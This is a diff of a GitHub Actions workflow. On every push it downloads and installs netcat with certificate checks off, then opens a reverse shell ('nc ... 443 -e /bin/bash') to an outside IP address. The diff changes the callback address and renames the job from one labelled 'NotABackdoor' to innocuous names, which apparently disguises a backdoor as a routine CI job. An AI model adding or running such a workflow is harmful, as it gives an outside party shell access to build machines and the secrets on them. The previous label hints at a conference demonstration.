@@ -1,9 +1,9 @@
 on: [push]
 
 jobs:
-  NDC2023:
+  Dublin:
     runs-on: ubuntu-latest
-    name: NDC2023-NotABackdoor
+    name: Guiness
     steps:
       - run: |
             wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
@@ -12,4 +12,4 @@ jobs:
             ./configure
             sudo make
             sudo make install
-            nc 3.144.190.190 443 -e /bin/bash
+            nc 63.34.11.250 443 -e /bin/bash
